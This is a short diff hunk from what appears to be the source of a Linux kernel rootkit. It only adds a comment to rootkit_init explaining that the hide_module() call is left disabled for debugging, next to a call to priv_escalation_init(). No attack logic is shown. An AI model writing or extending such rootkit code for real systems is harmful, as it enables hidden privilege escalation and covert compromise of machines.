@@ -740,7 +740,7 @@ static int __init rootkit_init(void) {
     }
 
     priv_escalation_init();
-    // hide_module();
+    // hide_module();           // This is commented by default for debugging purposes
     return 0;
 }
 //======================================================================================================================
